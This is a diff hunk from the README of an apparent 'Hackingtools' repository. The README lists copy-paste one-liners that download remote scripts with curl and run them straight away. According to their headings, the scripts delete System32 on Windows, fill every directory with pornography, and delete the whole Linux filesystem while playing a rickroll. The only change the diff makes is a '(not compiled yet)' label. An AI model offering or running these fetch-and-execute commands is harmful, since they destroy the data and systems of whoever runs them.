@@ -33,7 +33,7 @@ This little 'project' was made because I wanted to excercise in as many language
 #### 6 (Batch) - Deleting Sys32 😀
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/6/script.bat?raw=true -o script.bat & script.bat```
 ### Linux platform
-#### 2 (Node.js) - Downloads p0rn in every available directory
+#### 2 (Node.js) - Downloads p0rn in every available directory (not compiled yet)
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/2/script.js?raw=true -o script.js; node script.js```
 #### 3 (Bash) - rickrolling while deleting whole filesystem, use when escaping feds, death to whoever launches this without looking at the code 😂
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/3/script.sh?raw=true -o script; chmod+x script; ./script```
